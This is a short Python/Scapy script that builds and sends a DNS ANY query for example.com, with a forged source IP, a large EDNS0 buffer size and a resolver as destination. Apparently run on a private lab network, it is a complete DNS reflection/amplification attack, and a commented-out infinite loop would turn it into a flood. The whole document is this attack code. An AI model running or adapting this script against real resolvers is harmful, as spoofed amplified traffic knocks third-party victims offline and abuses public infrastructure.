from scapy.config import conf
from scapy.layers.dns import DNS, DNSQR, DNSRROPT
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import send
from scapy.volatile import RandShort

conf.verb = 0

request = (
        IP(src="172.16.238.10", dst="172.16.238.8") /
        UDP(dport=53, sport=RandShort()) /
        DNS(id=RandShort(), rd=1, qdcount=1, cd=1, qd=DNSQR(qname="example.com", qtype=255, qclass=1),
            ar=DNSRROPT(rclass=65527, rdlen=0)
            )
)
print(len(request))
# while 1:
send(request)
